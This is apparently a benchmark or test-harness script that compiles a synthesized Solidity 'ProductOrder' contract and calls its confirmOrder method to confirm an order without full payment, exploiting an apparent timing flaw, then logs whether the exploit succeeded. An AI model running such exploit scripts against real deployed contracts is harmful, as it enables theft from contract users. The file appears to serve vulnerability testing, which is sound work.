require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');
const { createLoggerWeb3 } = require('@lib/web3/deploy');



// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');

let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', 'ProductOrder-1.sol'), 'utf8');

async function exploit(web3, envInfo, contractAddress) {
    try {        
        // Load the contract
        let { abi } = await compileWithVersion(source, 'ProductOrder', 'ProductOrder', extractSolcVersion(source));
        let contractInstance = new web3.eth.Contract(abi, contractAddress);
        
        // Attempt to confirm the order without paying the full price by exploiting the timing vulnerability
        console.log(chalk.white("Attempting to confirm order within discount period without proper payment..."));
        let step1Receipt = await contractInstance.methods.confirmOrder().send({ 
            from: web3.eth.accounts.wallet[0].address,
            gas: 3000000 
        });
        await sleep(200);

        if (step1Receipt.status) {
            console.log(chalk.green("Exploit successful: Order confirmed without full payment!"));
            return true;
        } else {
            console.log(chalk.red("Exploit failed: Order confirmation unsuccessful."));
            return false;
        }
    } catch (error) {
        console.error(chalk.red("Error during exploitation:"), error);
        return false;
    }
}

module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
